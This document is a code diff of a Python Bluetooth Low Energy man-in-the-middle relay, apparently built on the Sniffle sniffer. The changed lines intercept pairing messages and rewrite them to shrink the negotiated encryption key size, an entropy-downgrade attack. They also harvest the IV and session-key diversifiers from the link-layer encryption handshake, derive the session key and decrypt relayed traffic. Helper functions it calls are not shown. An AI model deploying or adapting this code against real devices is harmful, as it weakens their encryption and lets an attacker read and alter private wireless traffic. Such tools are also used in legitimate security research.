@@ -70,9 +70,9 @@ last_pdu_c_to_p = None
 
 
 # IVs for building the full IV
-ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
-ivs_from_p = None   # IVs from real peripheral P (P -> C_r, LL_ENC_RSP)
-iv_real_cp = None   # IVm_from_c || IVs_from_p
+ivm_from_c = None   
+ivs_from_p = None   
+iv_real_cp = None   
 
 
 skdm_from_c  = None
@@ -80,11 +80,6 @@ skds_from_p  = None
 skd_real_cp  = None
 
 bonding = False
-sent_reject = False
-LLENCREQ_body_copy = None
-LLENCREQ_event_copy = None 
-pairing_req_to_ll_reject_ind = False
-
 repair = True
 
 
@@ -430,7 +425,7 @@ def try_load_ltk_from_file():
     # If the file is bigger, just take the first 16 bytes as the AES-128 key
     ltk = data[:16]
     ltk_found = True
-    print(f"[LTK] Loaded LTK from {LTK_BIN_PATH}: {_hx(ltk)}")
+    print(f"Loaded LTK from {LTK_BIN_PATH}: {_hx(ltk)}")
 
 def try_update_session_key():
     global ltk, ltk_found, session_key, skd_real_cp
@@ -573,9 +568,9 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
         block_req = filter_changes and is_param_req(msg)
         decrypted_payload = None
 
-        # LL_START_ENC_REQ / RSP (opcode 0x05) on this link, packetCounters are reset.
+        # LL_START_ENC_REQ detected means next message will be encrypted
+        # Start up packetCounter, set encryption 
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:
-            #New encryption session, reset counters
             link_encryption_active = True
             enc_ctr_p_to_c = -1
             enc_ctr_c_to_p = -1
@@ -583,7 +578,45 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
             last_sn_c_to_p = None
             last_pdu_p_to_c = None      
             last_pdu_c_to_p = None
-            print("Saw LL_START_ENC_RSP on real, packetCounters starts at -1")
+            log.debug("LL_START_ENC_RSP detected, packetCounters start and link is encrypted")
+
+
+        # LL_ENC_RSP from P to extract IV
+        # Handle LL_ENC_RSP from real peripheral (P->C_r)
+        # Should already have seen LL_ENC_REQ (C->P_r)
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
+            skds, ivs = _extract_skd_iv_from_ll_enc_rsp(msg)
+
+            if ivs is not None:
+                ivs_from_p = ivs
+                log.debug(f"[SE] IVs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(ivs_from_p)}")
+            else:
+                log.debug(f"[SE] IVs from real peripheral (LL_ENC_RSP on P->C_r): None, something went wrong!")
+
+
+            if skds is not None:
+                skds_from_p = skds
+                log.debug(f"[SE] SKDs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(skds_from_p)}")
+            else:
+                log.debug(f"[SE] SKDs from real peripheral (LL_ENC_RSP on P->C_r): None, something went wrong!")
+
+
+            # Combine IV when we have both halves
+            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
+                iv_real_cp = ivm_from_c + ivs_from_p
+                log.debug(f"[SE] Combined real IV (IVm||IVs): {_hx(iv_real_cp)}")
+            else:
+                log.debug(f"[SE] Combined real IV (IVm||IVs): Error, something went wrong when trying to combine")
+
+            # Combine SKD when we have both halves
+            if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
+                skd_real_cp = skdm_from_c + skds_from_p
+                log.debug(f"[SE] Combined real SKD (SKDm||SKDs): {_hx(skd_real_cp)}")
+                if ltk_found:
+                    log.debug(f"[SE] LTK is available, session key can be computed")
+                    try_update_session_key()
+            else:
+                log.debug(f"[SE] Combined real SKD (SKDm||SKDs): Error, something went wrong when trying to combine")
 
         packet_counter = None  # define here so it's visible later
         data_dir = 1           # Sniffle uses 1, but BLE convention uses direction bit 0
@@ -662,6 +695,16 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
                                 last_pdu_c_to_p = pdu
                                 print("C_r->P NEW encrypted PDU (SN same but payload changed) – resyncing packetCounter")
                 
+                # Downgrade the entropy
+                # Change the maximum encryption key size to the dowgraded value 
+                old_body = msg.body
+                new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
+                if changed:
+                    old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
+                    new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
+                    print(f"[PAIRING] Downgraded entropy: key size {old_ks} -> {new_ks}")
+                    msg.body = new_ll
+
                 #Check for pairing DHKey Check to check for a completion of a pairingprocedure
                 #Reset ltk_found, ltk, session key, IV and SKD
                 llid = hdr0 & 0x03 
@@ -669,14 +712,15 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
                     l2cap = pdu[2:2 + length]   
                     if len(l2cap) >= 4:
                         # L2CAP header: len[0:2], cid[2:4]
+                        # little endian value
                         cid = l2cap[2] | (l2cap[3] << 8)
-                        if cid == 0x0006:       # SMP 
+                        if cid == 0x0006:       
                             smp = l2cap[4:]
                             if len(smp) >= 1:
                                 smp_code = smp[0]
                                 # 0x0D = Pairing DHKey Check
                                 if smp_code == 0x0D:
-                                    print("[PAIRING] DHKey Check from peripheral – resetting LTK/session state")
+                                    log.debug("[PAIRING] DHKey Check from peripheral, pairing process is finished")
                                     reset_ltk_state_for_new_pairing()
 
 
@@ -686,7 +730,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
 
             if (link_encryption_active and has_payload and packet_counter is not None and ltk_found and session_key is not None and iv_real_cp is not None):
                 pt, mic_ok = decrypt_pdu(session_key, iv_real_cp, packet_counter, direction_bit, pdu)
-                print(f"[DEC] plaintext is {pt} and mic is {mic_ok}")
+                log.debug(f"[DECRYPTION] plaintext is {pt} and mic is {mic_ok}")
                 decrypted_payload = pt
                 if not mic_ok:
                     #If MIC does not check out, assume something went wrong over the air, 
@@ -757,59 +801,8 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
                         )
                         #write_tuple_aes_ecb(key_size, a0, keystream)
 
-
-
-        # LL_ENC_RSP from P to extract IV
-        # Handle LL_ENC_RSP from real peripheral (P->C_r)
-        # Should already have seen LL_ENC_REQ (C->P_r)
-        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
-            skds, ivs = _extract_skd_iv_from_ll_enc_rsp(msg)
-
-            if ivs is not None:
-                ivs_from_p = ivs
-                log.debug(f"[SE] IVs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(ivs_from_p)}")
-            else:
-                log.debug(f"[SE] IVs from real peripheral (LL_ENC_RSP on P->C_r): None, something went wrong!")
-
-
-            if skds is not None:
-                skds_from_p = skds
-                log.debug(f"[SE] SKDs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(skds_from_p)}")
-            else:
-                log.debug(f"[SE] SKDs from real peripheral (LL_ENC_RSP on P->C_r): None, something went wrong!")
-
-
-            # Combine IV when we have both halves
-            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
-                iv_real_cp = ivm_from_c + ivs_from_p
-                log.debug(f"[SE] Combined real IV (IVm||IVs): {_hx(iv_real_cp)}")
-            else:
-                log.debug(f"[SE] Combined real IV (IVm||IVs): Error, something went wrong when trying to combine")
-
-            # Combine SKD when we have both halves
-            if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
-                skd_real_cp = skdm_from_c + skds_from_p
-                log.debug(f"[SE] Combined real SKD (SKDm||SKDs): {_hx(skd_real_cp)}")
-                if ltk_found:
-                    log.debug(f"[SE] LTK is available, session key can be computed")
-                    try_update_session_key()
-            else:
-                log.debug(f"[SE] Combined real SKD (SKDm||SKDs): Error, something went wrong when trying to combine")
-
         # SMP PAIRINNG RSP
         # Downgrade entropy 
-        if not empty and not block_req and isinstance(msg, DataMessage):
-            old_body = msg.body
-            new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
-            if changed:
-                old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
-                new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
-                code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
-                print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
-                print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
-                print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
-                msg.body = new_ll
-
         if not empty and not block_req:
             # Forward packets to the relay slave
             conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
